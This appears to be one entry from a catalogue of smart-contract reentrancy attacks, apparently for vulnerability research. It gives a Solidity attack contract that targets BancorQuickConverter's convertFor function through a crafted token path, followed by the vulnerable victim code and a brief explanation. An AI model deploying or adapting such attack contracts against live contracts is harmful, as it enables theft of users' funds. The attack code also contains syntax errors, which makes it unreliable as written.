# Attack06

### Contract Name:

BancorQuickConverter (test487.sol)

### Contract Address:



### Transaction Count:



### Involved Ethers:



### Length of the Call Chain: 

1 external function

### Victim Function:

`convertFor(IERC20Token[],uint256,uint256,address) `

### Attack Mechanism:

Attack code:

```javascript
contract Attack is IERC20Token{
    BancorQuickConverter b = new BancorQuickConverter();
    constructor() payable {}
    IERC20Token[] _path
    function setPath() {
        _path[0] = Attack(this);
        _path[1] = Attack(this);
        _path[2] = Attack(this);
    }
    function deposit() public {   // Disguised attack function
        //victim.call.value(1 eth)(bytes4(keccak256("contribution(uint256)")), 10);
        b.convertFor.value(10)(_path, 10, 0, this);
    }
    function getvalue() returns (uint) {
        return this.balance;
    }
}
contract IERC20Token is IEtherToken {

}
contrac IEtherToken{}
```

Attacked code:

```javascript
contract BancorQuickConverter {
    ...
    modifier validConversionPath() {
        require(_path.length > 2 && _path.length <= (1 + 2 * 10) && _path.length % 2 == 1);
        _;
    }
    function convertFor(IERC20Token[] _path, uint256 _amount, uint256 _minReturn, address _for)
        public
        payable
        validConversionPath(_path)
        returns (uint256)
    {
        // if ETH is provided, ensure that the amount is identical to _amount and verify that the source token is an ether token
        IERC20Token fromToken = _path[0];
        require(msg.value == 0 || (_amount == msg.value && etherTokens[fromToken]));

        ISmartToken smartToken;
        IERC20Token toToken;
        ITokenConverter converter;
        uint256 pathLength = _path.length;

        // if ETH was sent with the call, the source is an ether token - deposit the ETH in it
        // otherwise, we assume we already have the tokens
        if (msg.value > 0)
            IEtherToken(fromToken).deposit.value(msg.value)();

        // iterate over the conversion path
        for (uint256 i = 1; i < pathLength; i += 2) {
            smartToken = ISmartToken(_path[i]);
            toToken = _path[i + 1];
            converter = ITokenConverter(smartToken.owner());

            // if the smart token isn't the source (from token), the converter doesn't have control over it and thus we need to approve the request
            if (smartToken != fromToken)
                ensureAllowance(fromToken, converter, _amount);

            // make the conversion - if it's the last one, also provide the minimum return value
            _amount = converter.change(fromToken, toToken, _amount, i == pathLength - 2 ? _minReturn : 1);
            fromToken = toToken;
        }

        // finished the conversion, transfer the funds to the target account
        // if the target token is an ether token, withdraw the tokens and send them as ETH
        // otherwise, transfer the tokens as is
        if (etherTokens[toToken])
            IEtherToken(toToken).withdrawTo(_for, _amount);
        else
            assert(toToken.transfer(_for, _amount));

        return _amount;
    }
    ...
}
```
In this case, the goal of our reentrancy is `IEtherToken(fromToken).deposit.value(msg.value)();` because fromToken is the source of taint. because the `convertFor` function's parameter '_path' is the source of taint.  

**Attack.** The attacker call `setPath()` function to specify the array `_path`.finally attacker call `deposit` to start attack.